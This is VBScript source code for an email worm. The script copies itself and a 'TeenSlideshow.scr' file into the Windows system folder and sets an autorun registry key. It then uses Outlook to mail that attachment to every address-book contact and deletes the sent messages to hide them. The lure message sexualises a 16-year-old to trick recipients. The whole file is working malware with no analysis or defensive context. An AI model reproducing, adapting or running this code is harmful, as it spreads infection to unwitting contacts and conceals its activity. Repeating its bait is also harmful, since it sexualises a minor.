'SUBSIX VERSION 1 !! FROM ROMANIA CREW TO B.E.G.MAFIA !!
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1)& "\WinSystem.vbs"
fso.copyfile "TeenSlideshow.scr",fso.GetSpecialFolder(1)& "\TeenSlideshow.scr"
Set WindowsShell = CreateObject("WScript.Shell")
WindowsShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SubSix","wscript.exe "&fso.GetSpecialFolder(1)& "\WinSystem.vbs %"
if WindowsShell.regread ("HKCU\software\SubSix\Penis") <> "1" then
SendMail()
end if
Function SendMail()
On Error Resume Next
Set MailClient = CreateObject("Outlook.Application")
If MailClient = "Outlook" Then
Set LocalMail = MailClient.GetNameSpace("MAPI")
Set AddressBookEntrys = LocalMail.AddressLists
For Each AddressControl In AddressBookEntrys
If AddressControl.AddressEntries.Count <> 0 Then
NumAddres = AddressControl.AddressEntries.Count
For Control2 = 1 To NumAddres
Set MailMesg = MailClient.CreateItem(0)
Set CurrentEntry = AddressControl.AddressEntries(Control2)
MailMesg.To = CurrentEntry.Address
MailMesg.Subject = "cool Teen Nude Slideshow, check it"
MailMesg.Body = "Check out this, 16yrs old strips all the way!"
set DoTheShit = MailMesg.Attachments
DoTheShit.Add fso.GetSpecialFolder(1)& "\TeenSlideshow.scr"
MailMesg.DeleteAfterSubmit = True
If MailMesg.To <> "" Then
MailMesg.Send
WindowsShell.regwrite "HKCU\software\SubSix\Penis", "1"
End If
Next
End If
Next
end if
End Function
